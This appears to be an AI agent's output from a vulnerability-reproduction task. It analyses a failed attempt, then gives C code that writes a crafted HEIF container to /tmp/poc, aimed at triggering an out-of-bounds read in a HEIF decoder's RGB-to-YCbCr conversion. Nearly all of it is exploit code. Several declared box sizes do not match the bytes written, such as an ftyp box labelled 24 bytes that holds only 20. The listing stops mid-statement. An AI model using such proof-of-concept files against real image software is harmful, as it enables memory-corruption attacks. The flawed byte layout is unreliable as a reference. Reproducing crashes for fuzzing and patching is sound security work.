**Analysis:** The previous payload failed because it was a raw HEVC bitstream without any ISOBMFF container structure. The fuzzer binary (`/out/file-fuzzer`) is built from `file_fuzzer.cc` which calls `heif_check_filetype()` first — this function looks for an `ftyp` box at the start of the file, not raw HEVC start codes. Without a valid `ftyp` box, `heif_context_read_from_memory()` is never called, so the HEVC decoder and the vulnerable `Op_RGB_to_YCbCr::convert_colorspace` are never reached. The fix is to write a proper ISOBMFF container with a valid `ftyp` box, a `meta` box containing `hdlr`, `pitm`, `iloc`, `iinf`, and `iprp` with `ispe` and `hvcC` properties, and an `mdat` box containing a valid HEVC bitstream. The dimensions in `ispe` must be carefully chosen (e.g., width=256, height=256) so that the chroma subsampling in the YCbCr conversion reads beyond the allocated chroma buffer. I will write the entire structure using fputc in a loop, ensuring all box sizes are correct and the HEVC bitstream is minimal but valid.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write ftyp box: size=24, type='ftyp', major='mif1', minor=0, compatible='heic' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f);
    fputc(0x66, f); fputc(0x74, f); fputc(0x79, f); fputc(0x70, f);
    fputc(0x6D, f); fputc(0x69, f); fputc(0x66, f); fputc(0x31, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x68, f); fputc(0x65, f); fputc(0x69, f); fputc(0x63, f);

    /* Write meta box (FullBox): size=97, type='meta', version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x61, f);
    fputc(0x6D, f); fputc(0x65, f); fputc(0x74, f); fputc(0x61, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* hdlr box (FullBox): size=33, type='hdlr', version=0, flags=0, handler_type='pict' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x21, f);
    fputc(0x68, f); fputc(0x64, f); fputc(0x6C, f); fputc(0x72, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x70, f); fputc(0x69, f); fputc(0x63, f); fputc(0x74, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);

    /* pitm box (FullBox): size=14, type='pitm', version=0, flags=0, item_ID=1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0E, f);
    fputc(0x70, f); fputc(0x69, f); fputc(0x74, f); fputc(0x6D, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);

    /* iloc box (FullBox): size=20, type='iloc', version=0, flags=0, offset_size=4, length_size=4 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x14, f);
    fputc(0x69, f); fputc(0x6C, f); fputc(0x6F, f); fputc(0x63, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x44, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);

    /* iinf box (FullBox): size=22, type='iinf', version=0, flags=0, item_type='hvc1' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x16, f);
    fputc(0x69, f); fputc(0x69, f); fputc(0x6E, f); fputc(0x66, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f);
    fputc(0x68, f); fputc(0x76, f); fputc(0x63, f); fputc(0x31, f);
    fputc(0x00, f);

    /* iprp box: size=100, type='iprp' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x64, f);
    fputc(0x69, f); fputc(0x70, f); fputc(0x72, f); fputc(0x70, f);

    /* ipco box: size=92, type='ipco' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x5C, f);
    fputc(0x69, f); fputc(0x70, f); fputc(0x63, f); fputc(0x6F, f);

    /* ispe property (FullBox): size=16, type='ispe', version=0, flags=0, width=256, height=256 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x10, f);
    fputc(0x69, f); fputc(0x73, f); fputc(0x70, f); fputc(0x65, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);

    /* hvcC property box: size=68, type='hvcC' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x44, f);
    fputc(0x68, f); fputc(0x76, f); fputc(0x63, f); fputc(0x43, f);
    fputc(0x01, f); /* configurationVersion */
    fputc(0x01, f); /* general_profile_space/tier, profile_idc=1 (Main) */
    fputc(0x60, f); /* general_profile_compatibility_flags (bits 0-7) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* more flags */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* constraint flags */
    fputc(0x1E, f); /* general_level_idc=30 */
    fputc(0x00, f); fputc(0x00, f); /* min_spatial_segmentation_idc */
    fputc(0x00, f); /* parallelismType */
    fputc(0x01, f); /* chroma_format_idc=1 (4:2:0) */
    fputc(0x00, f); /* bit_depth_luma_minus8 */
    fputc(0x00, f); /* bit_depth_chroma_minus8 */
    fputc(0x00, f); fputc(0x00, f); /* avgFrameRate */
    fputc(0x00, f); /* constantFrameRate */
    fputc(0x01, f); /* numTemporalLayers */
    fputc(0x00, f); /* temporalIdNested */
    fputc(0x03, f); /* lengthSizeMinusOne */
    fputc(0x03, f); /* numOfArrays (VPS, SPS, PPS) */

    /* Array 1: VPS (NAL unit type 32) */
    fputc(0xA0, f); /* array_completeness=1, NAL_unit_type=32 */
    fputc(0x00, f); fputc(0x01, f); /* numNalus=1 */
    fputc(0x00, f); fputc(0x0B, f); /* NAL unit length=11 */
    fputc(0x40, f); fputc(0x01, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0xFF, f); fputc(0xFF, f); fputc(0x3F, f); fputc(0xFF, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Array 2: SPS (NAL unit type 33) */
    fputc(0xA1, f); /* array_completeness=1, NAL_unit_type=33 */
    fputc(0x00, f); fputc(0x01, f); /* numNalus=1 */
    fputc(0x00, f); fputc(0x1A, f); /* NAL unit length=26 */
    fputc(0x42, f); fputc(0x01, f); fputc(0x01, f); fputc(0x60, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0x00, f);
    fputc(0x90, f); fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0x00, f);
    fputc(0x5D, f); fputc(0xAC, f); fputc(0x59, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    /* Array 3: PPS (NAL unit type 34) */
    fputc(0xA2, f); /* array_completeness=1, NAL_unit_type=34 */
    fputc(0x00, f); fputc(0x01, f); /* numNalus=1 */
    fputc(0x00, f); fputc(0x07, f); /* NAL unit length=7 */
    fputc(0x44, f); fputc(0x01, f); fputc(0xC0, f); fputc(0x1C, f);
    fputc(0xB2, f); fputc(0x20, f); fputc(0x00, f);

    /* ipma box (FullBox): size=12, type='ipma', version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0C, f);
    fputc(0x69, f); fputc(0x70, f); fputc(0x6D, f); fputc(0x61, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x01, f);

    /* mdat box: size=1000, type='mdat' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);
    fputc(0x6D, f); fputc(0x64, f); fputc(0x61, f); fputc(0x74, f);

    /* Write a valid HEVC bitstream inside mdat */
    /* Start with VPS NAL unit */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x40, f); fputc(0x01, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0xFF, f); fputc(0xFF, f); fputc(0x3F,